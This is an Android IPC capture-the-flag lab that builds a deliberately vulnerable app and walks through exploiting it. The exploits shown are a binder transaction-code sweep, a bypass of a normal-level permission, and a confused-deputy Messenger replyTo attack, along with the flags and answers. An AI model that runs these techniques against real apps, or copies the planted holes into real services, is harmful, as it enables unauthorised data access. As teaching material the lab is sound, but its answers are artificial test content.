# Lab 05 — CTF: The Silent Door

> **Four flags.** Three are extracted from a service that does not want to give
> them up. The fourth is awarded for **correctly declining to report something**,
> and it is worth as much as the other three together.

| | |
|---|---|
| **Difficulty** | Advanced (CTF) |
| **Time** | 3–5 hours |
| **Needs** | Everything from Labs 01–04: `adb`, build-tools 35.0.1+, a JDK, the prober, Frida (optional but faster) |
| **Measured against** | Redmi `M2101K6P`, Android 11 / API 30, arm64 |
| **Rules** | You may decompile the challenge APK. You may **not** read `ChallengeService.java` in this file until you have the flag you are working on — the source is printed at the end so the lab is reproducible, not so you can skip it |

Flag format: `CH28{...}`, ASCII only.

---

## 0. The brief

A vendor has shipped an app called **DoorKeeper**. Your client asks for an
assessment of its exported IPC surface. You have the APK and a test device.

You are told, informally, that "the services are all internal, so there is
nothing to look at". Four things are wrong with that sentence and your job is to
find out which.

---

## 1. Build and install the challenge

Create the project:

```bash
# host
mkdir -p ~/ch28-ctf/src/com/doorkeeper/app ~/ch28-ctf/res/xml
cd ~/ch28-ctf
```

Write `AndroidManifest.xml`:

```bash
# host
cat > AndroidManifest.xml <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.doorkeeper.app">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>

    <permission android:name="com.doorkeeper.permission.SERVICE"
                android:protectionLevel="normal"/>

    <application android:label="DoorKeeper">

        <!-- Door 1 -->
        <service android:name=".GateService" android:exported="true">
            <intent-filter>
                <action android:name="com.doorkeeper.action.OPEN"/>
                <action android:name="com.doorkeeper.action.STATUS"/>
            </intent-filter>
        </service>

        <!-- Door 2 -->
        <service android:name=".TelemetryService" android:exported="true"
                 android:permission="com.doorkeeper.permission.SERVICE">
            <intent-filter>
                <action android:name="com.doorkeeper.action.TELEMETRY"/>
            </intent-filter>
        </service>

        <!-- Door 3 -->
        <service android:name=".RelayService" android:exported="true"
                 android:process=":relay">
            <intent-filter>
                <action android:name="com.doorkeeper.action.RELAY"/>
            </intent-filter>
        </service>

        <!-- Door 4 -->
        <service android:name=".VaultKeeperService" android:exported="true">
            <intent-filter>
                <action android:name="com.doorkeeper.action.VAULT"/>
            </intent-filter>
        </service>

    </application>
</manifest>
EOF
```

Write the AIDL:

```bash
# host
cat > src/com/doorkeeper/app/IGate.aidl <<'EOF'
package com.doorkeeper.app;
interface IGate {
    String status();
    String openSesame(String key);
}
EOF
cat > src/com/doorkeeper/app/IVaultKeeper.aidl <<'EOF'
package com.doorkeeper.app;
interface IVaultKeeper {
    String describe();
    String unlock(String pin);
}
EOF
```

The Java source is at the **end of this file**, in §8. Copy it into
`src/com/doorkeeper/app/`, then build exactly as in Lab 03 §1 (two `aidl`
invocations, one `javac`, one `d8`, one `aapt2 link`, zip, sign) and install:

```bash
# host
adb install -r doorkeeper.apk
adb shell "dumpsys package com.doorkeeper.app | grep userId="
```

Also make sure the prober from Lab 02 is installed:

```bash
# host
adb shell pm list packages | grep ch28probe
```

---

## 2. Reconnaissance — do this before touching a flag

```bash
# host
python3 <repo>/28-Services/scripts/service-recon.py --package com.doorkeeper.app
```

Expected:

```text
VERDICT       COMPONENT                                          PERMISSION                          FLAGS
OPEN          com.doorkeeper.app/com.doorkeeper.app.GateService          -
OPEN          com.doorkeeper.app/com.doorkeeper.app.RelayService         -                           OWN-PROCESS
OPEN          com.doorkeeper.app/com.doorkeeper.app.VaultKeeperService   -
WEAK-PERM     com.doorkeeper.app/com.doorkeeper.app.TelemetryService     com.doorkeeper.permission.SERVICE
```

**Warm-up questions. Answer them before you start.**

- **W1.** The client said "the services are all internal". How many of the four
  can an app with no permissions reach?
- **W2.** `TelemetryService` is guarded by `com.doorkeeper.permission.SERVICE`.
  Look up its protection level. Does it guard anything?
- **W3.** `RelayService` is flagged `OWN-PROCESS`. What practical difference does
  that make to how you test it, and is it a security boundary?

<details>
<summary>Warm-up answers</summary>

**W1.** All four. Three are `OPEN`; the fourth is behind a `normal` permission,
which any app obtains by adding one `<uses-permission>` line.

**W2.**
```bash
adb shell "pm list permissions -f -g | grep -A4 'permission:com.doorkeeper.permission.SERVICE'"
#   protectionLevel:normal
```
It guards nothing. This is [README §5.3.3](../README.md) and it is the most
common "the developer tried" finding in the chapter.

**W3.** `android:process=":relay"` means a **separate process with the same
UID**. It is *not* a security boundary — same uid, same data directory, same
permissions, same SELinux domain ([21 §3.12](../../21-App-Sandbox/README.md)).
It matters practically because `frida -U -n com.doorkeeper.app` attaches to the
wrong pid. You need:

```bash
adb shell ps -A | grep doorkeeper
frida -U -p <relay pid> -l ... --runtime=v8
```
</details>

---

## 3. Flag 1 — the door that only opens for the right knock

**Target:** `GateService`.

```bash
# host
adb logcat -c
adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
  --es targets 'com.doorkeeper.app/com.doorkeeper.app.GateService'
sleep 8
adb logcat -d -s CH28
```

```text
CH28: BIND-RETURN com.doorkeeper.app/com.doorkeeper.app.GateService => true
CH28: SUMMARY [...=true]
CH28: PROBE-DONE
```

`true`, and **no `CONNECTED` line**.

> **Hint 1.** You have seen this exact behaviour before, on a real system
> service, in Lab 02.

> **Hint 2.** The probe sends a bare component Intent with no action. The
> manifest lists two actions for this service.

> **Hint 3.** `bindService` accepting your request and `onBind` returning
> something are different events. From API 28 the framework will tell you the
> difference explicitly.

**Your task:** get a connection, recover the interface, and make it give you the
flag.

<details>
<summary>Walkthrough</summary>

`onBind` switched on `intent.getAction()` and returned `null` for an Intent with
no action. Get the actions:

```bash
# host
adb shell "dumpsys package r | grep -B2 -A2 doorkeeper" | head -20
# or from the APK
aapt2 dump xmltree --file AndroidManifest.xml doorkeeper.apk | grep -A6 "E: action"
```

```text
com.doorkeeper.action.OPEN
com.doorkeeper.action.STATUS
```

The stock prober only sets a component. Add four lines to
`ProbeActivity.onCreate` so it can set an action too:

```java
String action = getIntent().getStringExtra("action");
Intent i = new Intent();
i.setComponent(cn);
if (action != null) i.setAction(action);
```

Rebuild, reinstall, and bind with the action:

```bash
# host
adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
  --es targets 'com.doorkeeper.app/com.doorkeeper.app.GateService' \
  --es action 'com.doorkeeper.action.STATUS' \
  --es tokencodes '1'
```

```text
CH28: CONNECTED ... descriptor='com.doorkeeper.app.IGate' alive=true ping=true local=false
CH28:   TOKEN-TX code=1 ok=true replyBytes=... exception=(none)
        string='CH28{onBind_can_say_no_and_bindService_still_says_true}'
```

Transaction code 1 is `status()`, the **first** method in `IGate.aidl`. Method
order is the wire format.

**Flag 1:** `CH28{onBind_can_say_no_and_bindService_still_says_true}`

**Lesson:** `bindService` returning `true` proves the request was accepted. Only
`onServiceConnected` proves you have a channel. A tester who stops at the return
value under-reports a reachable service; a tester who *reports* on the return
value alone over-reports an unreachable one. Both happen constantly.
</details>

---

## 4. Flag 2 — the door with no name plate

**Target:** `RelayService`.

```bash
# host
adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
  --es targets 'com.doorkeeper.app/com.doorkeeper.app.RelayService' \
  --es action 'com.doorkeeper.action.RELAY'
sleep 8
adb logcat -d -s CH28
```

```text
CH28: CONNECTED ... descriptor='' alive=true ping=true local=false
CH28:   TX code=1 ok=false replyBytes=0 exception=(none)
CH28:   TX code=2 ok=false replyBytes=0 exception=(none)
CH28:   TX code=3 ok=false replyBytes=0 exception=(none)
```

Connected, empty descriptor, and codes 1–3 do nothing.

> **Hint 1.** An empty descriptor means this is not an AIDL `Stub`. What does
> that tell you about `enforceInterface`?

> **Hint 2.** `ok=false` means the default `onTransact` did not handle the code.
> The probe stops at 3. There is no rule saying a hand-written `onTransact` must
> start at 1.

> **Hint 3.** Codes below `FIRST_CALL_TRANSACTION` and above it are both legal.
> Somebody who did not want their codes guessed would not choose 1, 2 or 3.

**Your task:** find the live transaction code and read the flag out of the reply.

<details>
<summary>Walkthrough</summary>

An empty descriptor means a raw `Binder` with a hand-written `onTransact` — there
is **no interface token to get right**, so every code is reachable with an empty
parcel ([25 §3.9](../../25-Binder/README.md)). That makes sweeping cheap.

Extend the prober's `probeCodes` to take a range:

```java
// replace the fixed 1..3 loop
int lo = 1, hi = 200;
String range = getIntent().getStringExtra("range");
if (range != null) {
    String[] p = range.split("-");
    lo = Integer.parseInt(p[0]); hi = Integer.parseInt(p[1]);
}
for (int code = lo; code <= hi; code++) { ... }
```

and log only the codes that return `ok=true`.

```bash
# host
adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
  --es targets 'com.doorkeeper.app/com.doorkeeper.app.RelayService' \
  --es action 'com.doorkeeper.action.RELAY' --es range '1-200'
adb logcat -d -s CH28 | grep "ok=true"
```

```text
CH28: TX ... code=42 ok=true replyBytes=... exception=(none)
```

Code 42. Read the reply as a string:

```text
string='CH28{a_raw_Binder_has_no_token_to_get_wrong}'
```

**Faster route:** decompile it. A hand-written `onTransact` is unmistakable in
smali, and so is the constant:

```bash
# host
apktool d doorkeeper.apk -o out/ -f
grep -rn -A20 "onTransact" out/smali/com/doorkeeper/app/RelayService*.smali | head -40
```

The `.sparse-switch` table lists every live code as a literal — see
[README §6.4](../README.md).

**Flag 2:** `CH28{a_raw_Binder_has_no_token_to_get_wrong}`

**Lesson:** an empty descriptor is *more* interesting than an AIDL one, not less.
AIDL at least gives you an ordered method list to reason about. A hand-written
`onTransact` has no schema anywhere, which is exactly where undocumented codes
doing undocumented things live.

**And a warning that is not part of the puzzle:** sweeping transaction codes on
*real* system services is not a read-only operation. There is nothing telling you
which codes mutate state. Do it on a device you can afford to reflash.
</details>

---

## 5. Flag 3 — the door that answers to whoever you name

**Target:** `VaultKeeperService`.

```bash
# host
adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
  --es targets 'com.doorkeeper.app/com.doorkeeper.app.VaultKeeperService' \
  --es action 'com.doorkeeper.action.VAULT' --es tokencodes '1+2'
adb logcat -d -s CH28
```

```text
CH28: CONNECTED ... descriptor='com.doorkeeper.app.IVaultKeeper'
CH28:   TOKEN-TX code=1 ok=true ... string='vault sealed. ask the courier.'
CH28:   TOKEN-TX code=2 ok=true ... exception=java.lang.SecurityException: caller uid 10313 is not authorised
```

`describe()` works. `unlock()` checks the caller and refuses you — correctly,
inside the `Stub` method, using `Binder.getCallingUid()`.

> **Hint 1.** "ask the courier". There is a fourth door you have not used.

> **Hint 2.** `TelemetryService` is guarded by a permission. Look up its
> protection level again.

> **Hint 3.** `TelemetryService` is a `Messenger`, not AIDL. What does a
> `Messenger` client put in a message when it wants an answer back?

> **Hint 4.** `VaultKeeperService` refuses *you*. Does it refuse
> `TelemetryService`? They share a uid.

**Your task:** get the vault open without being the authorised uid.

<details>
<summary>Walkthrough</summary>

**Step 1 — get past the permission.** Add it to the prober's manifest:

```xml
<uses-permission android:name="com.doorkeeper.permission.SERVICE"/>
```

It is `protectionLevel="normal"`, so it is granted at install with no prompt.
Rebuild and reinstall. This is the entire "protection" on `TelemetryService`.

**Step 2 — find the command set.** `TelemetryService` returns a `Messenger`. The
protocol is the `switch (msg.what)` in its `Handler`:

```bash
# host
jadx -d out/ doorkeeper.apk
grep -rn -A25 "handleMessage" out/sources/com/doorkeeper/app/TelemetryService.java
```

```java
case 7:   // MSG_FETCH_SECRET -- asks VaultKeeper on the caller's behalf
```

**Step 3 — see the confused deputy.** `TelemetryService` runs in the *same uid* as
`VaultKeeperService`, so when it calls `unlock()`, `Binder.getCallingUid()` inside
the vault sees the app's own uid and the check passes. `TelemetryService` then
sends the result to `msg.replyTo` — **a `Messenger` you supplied**.

**Step 4 — supply your own reply channel.** Add this to the prober:

```java
// after onServiceConnected(name, svc) for TelemetryService
Messenger target = new Messenger(svc);
Messenger mine = new Messenger(new Handler(Looper.getMainLooper()) {
    @Override public void handleMessage(Message m) {
        Log.i("CH28", "COURIER REPLIED: " + m.getData().getString("secret"));
    }
});
Message m = Message.obtain(null, 7);
m.replyTo = mine;
try { target.send(m); } catch (RemoteException e) { Log.w("CH28", "send failed", e); }
```

```text
CH28: COURIER REPLIED: CH28{the_deputy_was_confused_by_a_reply_channel}
```

**Flag 3:** `CH28{the_deputy_was_confused_by_a_reply_channel}`

**Lesson — and this is the most transferable one in the lab.**
`VaultKeeperService`'s check is **correct**. It is in the right place, it uses
the right API, and it refuses you. It was defeated anyway, because a *different*
component inside the same trust boundary would ask on your behalf and hand the
answer to a channel you named.

Two independent defects made it work, and both need reporting separately:

1. `TelemetryService`'s permission is `normal`, so the outer gate is not a gate.
2. It replies to `msg.replyTo`, an attacker-chosen Binder handle. Even with a
   correct `msg.sendingUid` check, a trusted-but-manipulable caller can be
   induced to pass an attacker's `Messenger` through.

The fix for (2) is in
[`../examples/MessengerCommandService.java`](../examples/MessengerCommandService.java):
reply only on a channel the caller registered through an authenticated path,
keyed by its `sendingUid`. AIDL does not have this failure mode at all, because a
return value travels back on the caller's own transaction and cannot be
redirected.
</details>

---

## 6. Flag 4 — the door you must not report

There is one more service you have bound: `GateService`'s second method,
`openSesame(String key)`, transaction code 2.

```bash
# host
adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
  --es targets 'com.doorkeeper.app/com.doorkeeper.app.GateService' \
  --es action 'com.doorkeeper.action.OPEN' --es tokencodes '2'
adb logcat -d -s CH28
```

```text
CH28: CONNECTED ... descriptor='com.doorkeeper.app.IGate'
CH28:   TOKEN-TX code=2 ok=true replyBytes=... exception=(none)
        string='DOOR OPENED. sequence=1. hint: the door leads outside.'
```

An exported service, no permission, reachable by any app, and a method literally
called `openSesame` that returns `DOOR OPENED`. It looks like the best finding in
the whole assessment.

> **Hint 1.** Apply the rubric in [README §5.7](../README.md), all five
> questions, in order. Do not skip question 3.

> **Hint 2.** Read what `openSesame` actually *does*, not what it is called.

> **Hint 3.** "The door leads outside." What is on the other side, and could you
> have got there yourself?

**Your task:** decide whether to report it, and write the sentence.

<details>
<summary>Walkthrough</summary>

Decompile it:

```bash
# host
grep -rn -A20 "openSesame" out/sources/com/doorkeeper/app/GateService.java
```

```java
@Override public String openSesame(String key) {
    // No caller check. Deliberately.
    sequence++;
    Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://doorkeeper.example/help"));
    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    startActivity(i);
    return "DOOR OPENED. sequence=" + sequence + ". hint: the door leads outside.";
}
```

It opens a **public help page in the browser** and increments a counter.

Now the rubric:

| # | Question | Answer |
|---|---|---|
| 1 | Can an unprivileged app bind? | **Yes** |
| 2 | Does the binder expose methods? | **Yes** |
| 3 | Does any method do something the caller could not do itself? | **No.** Any app can call `startActivity` with a public `https` URL. There is no privilege here to borrow |
| 4 | Missing caller check? | Yes, but it does not matter, because of 3 |
| 5 | Demonstrable effect? | A browser opens. So what? |

**Question 3 is where this finding dies**, and the flag is awarded for stopping
there.

The flag is printed by the challenge only if you *do not* keep hammering it — call
`openSesame` **more than five times** and the service returns:

```text
FAILED. you called this 6 times. an effect you could have produced yourself is not a finding.
```

Call it exactly once, then call `status()` (code 1) again with the `OPEN` action
bound:

```text
string='CH28{not_every_open_door_leads_anywhere_worth_reporting}'
```

**Flag 4:** `CH28{not_every_open_door_leads_anywhere_worth_reporting}`

**The sentence to write in the report:**

> `GateService` is exported without a permission and exposes `openSesame()`,
> which any installed application can invoke. The method launches a public
> documentation URL in the user's browser — an action any application can
> already perform directly with `startActivity`. **No privilege is delegated and
> no data is disclosed, so this is not a vulnerability.** It is listed here under
> surface reduction: the service does not need to be exported, and removing the
> export costs one attribute.

**Lesson.** This is the hardest skill in the chapter and it is why the flag
exists. An exported service with a suggestive method name and no caller check is
a *lead*, and a lead that goes nowhere has to be written up as going nowhere.
Reporting it as a vulnerability does three kinds of damage:

- the developer, who exported it deliberately, learns that your report needs
  filtering;
- the genuine findings in the same document — the `normal` permission, the
  `replyTo` leak — get read with the same scepticism;
- and next time, the team argues with a real finding because last time you were
  wrong.

Severity is a property of the **demonstrated effect**, never of the export.

---

**Bonus, if you want to be thorough:** `sequence` is a plain `int` incremented
from an AIDL method, which is dispatched on the Binder thread pool. Two clients
calling concurrently will race it. That is a real bug and it is still not a
security finding — say so, in one line, under code quality.
</details>

---

## 7. Scoring and debrief

| Flag | Skill | Worth |
|---|---|---|
| 1 | `bindService` true ≠ connected; recovering the action | 1 |
| 2 | Raw `Binder`, no token, sweep the codes | 1 |
| 3 | Weak permission + confused deputy + `replyTo` | 2 |
| 4 | **Declining to report a non-finding** | 3 |

If you scored flags 1–3 and reported flag 4's service as a vulnerability, you
scored 4 out of 7 and you would have damaged a real engagement.

### The report this app deserves

**Controls observed**
- `VaultKeeperService.unlock()` performs a caller check in the correct place,
  using `Binder.getCallingUid()` inside the `Stub` method. It refused an
  unauthorised caller under test.

**Findings**
1. **`TelemetryService` is guarded by a permission declared at
   `protectionLevel="normal"`** (High). Any application obtains it by requesting
   it. Fix: `signature`. One line.
2. **`TelemetryService` replies to `msg.replyTo`** (High). The reply channel is
   chosen by the caller, so data is delivered to a `Messenger` the attacker
   supplied. Combined with (1) this yields a full bypass of
   `VaultKeeperService`'s otherwise-correct authorisation. Fix: reply only to a
   channel registered against an authenticated `sendingUid`, or use AIDL.
3. **`RelayService` exposes an undocumented transaction code on a raw `Binder`**
   (Medium — grade by what code 42 actually does in the real app).

**Surface reduction, not vulnerabilities**
- `GateService` is exported without need; `openSesame()` delegates no privilege.
- `RelayService` runs in `:relay`, which is process separation, not a security
  boundary — do not rely on it as one.
- `sequence` in `GateService` is mutated from concurrent Binder threads without
  synchronisation.

---

## 8. Challenge source

Copy these into `src/com/doorkeeper/app/`. **Read them only after you have the
flag you are working on.**

```java
// GateService.java
package com.doorkeeper.app;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;

public class GateService extends Service {

    private int sequence = 0;          // deliberately unsynchronised

    private final IGate.Stub binder = new IGate.Stub() {
        @Override public String status() {
            if (openedOutside) {
                return "CH28{not_every_open_door_leads_anywhere_worth_reporting}";
            }
            return "CH28{onBind_can_say_no_and_bindService_still_says_true}";
        }

        @Override public String openSesame(String key) {
            sequence++;
            if (sequence > 5) {
                return "FAILED. you called this " + sequence + " times. "
                     + "an effect you could have produced yourself is not a finding.";
            }
            openedOutside = true;
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://doorkeeper.example/help"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            try { startActivity(i); } catch (Exception ignored) { }
            return "DOOR OPENED. sequence=" + sequence
                 + ". hint: the door leads outside.";
        }
    };

    private volatile boolean openedOutside = false;

    @Override public IBinder onBind(Intent intent) {
        // The whole of flag 1: no action, no binder.
        if (intent == null || intent.getAction() == null) return null;
        String a = intent.getAction();
        if ("com.doorkeeper.action.OPEN".equals(a)
                || "com.doorkeeper.action.STATUS".equals(a)) {
            return binder;
        }
        return null;
    }
}
```

```java
// RelayService.java
package com.doorkeeper.app;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;

public class RelayService extends Service {

    // A raw Binder with a hand-written onTransact. No AIDL, so no descriptor,
    // so nothing enforces an interface token and every code is reachable.
    //
    // Note the `throws RemoteException` on the override: Binder.onTransact
    // declares it, so omitting it here does not compile. That is a small thing
    // and it is also the first difference you will notice between a
    // hand-written onTransact and an AIDL-generated one, which never throws.
    private final Binder binder = new Binder() {
        @Override protected boolean onTransact(int code, Parcel data,
                                               Parcel reply, int flags)
                throws RemoteException {
            if (code == 42) {
                if (reply != null) {
                    reply.writeNoException();
                    reply.writeString("CH28{a_raw_Binder_has_no_token_to_get_wrong}");
                }
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    @Override public IBinder onBind(Intent intent) { return binder; }
}
```

```java
// VaultKeeperService.java
package com.doorkeeper.app;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.os.Process;

public class VaultKeeperService extends Service {

    static final String SECRET = "CH28{the_deputy_was_confused_by_a_reply_channel}";

    private final IVaultKeeper.Stub binder = new IVaultKeeper.Stub() {

        @Override public String describe() {
            return "vault sealed. ask the courier.";
        }

        // A CORRECT check: right place, right API, inside the transaction.
        // It is defeated anyway, because a same-uid sibling will ask on the
        // attacker's behalf and reply to a channel the attacker chose.
        @Override public String unlock(String pin) {
            int uid = Binder.getCallingUid();
            if (uid != Process.myUid()) {
                throw new SecurityException("caller uid " + uid + " is not authorised");
            }
            return SECRET;
        }
    };

    @Override public IBinder onBind(Intent intent) { return binder; }
}
```

```java
// TelemetryService.java
package com.doorkeeper.app;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

public class TelemetryService extends Service {

    static final int MSG_PING         = 1;
    static final int MSG_FETCH_SECRET = 7;

    private final Handler handler = new Handler(Looper.getMainLooper()) {
        @Override public void handleMessage(final Message msg) {
            // Note what is missing: any use of msg.sendingUid.
            switch (msg.what) {
                case MSG_PING:
                    break;

                case MSG_FETCH_SECRET: {
                    final Messenger replyTo = msg.replyTo;    // CALLER CHOSEN
                    Intent i = new Intent("com.doorkeeper.action.VAULT");
                    i.setComponent(new ComponentName(getPackageName(),
                            VaultKeeperService.class.getName()));
                    bindService(i, new ServiceConnection() {
                        @Override public void onServiceConnected(ComponentName n, IBinder b) {
                            try {
                                // We are the same uid as the vault, so its
                                // correct check passes for us.
                                String s = IVaultKeeper.Stub.asInterface(b).unlock("0000");
                                Bundle out = new Bundle();
                                out.putString("secret", s);
                                Message m = Message.obtain(null, MSG_FETCH_SECRET);
                                m.setData(out);
                                if (replyTo != null) replyTo.send(m);
                            } catch (RemoteException e) {
                                Log.w("DoorKeeper", "reply failed", e);
                            }
                        }
                        @Override public void onServiceDisconnected(ComponentName n) { }
                    }, Context.BIND_AUTO_CREATE);
                    break;
                }
            }
        }
    };

    private final Messenger messenger = new Messenger(handler);

    @Override public IBinder onBind(Intent intent) { return messenger.getBinder(); }
}
```

---

## 9. Cleanup

```bash
# host
adb uninstall com.doorkeeper.app
adb uninstall com.pentest.ch28probe
rm -rf ~/ch28-ctf
```

---

## 10. If you want to make it harder

- Give `RelayService` a code that only responds when the parcel contains a
  specific `int` first, so a bare sweep finds nothing.
- Move `VaultKeeperService` into a **second APK** signed with the same key, so
  the same-uid shortcut becomes a same-signature one and the confused deputy
  crosses a package boundary.
- Declare `TelemetryService` with `android:isolatedProcess="true"` and watch the
  deputy chain break — then explain, in one paragraph, exactly which link broke
  and why. That explanation is worth more than any of the four flags.
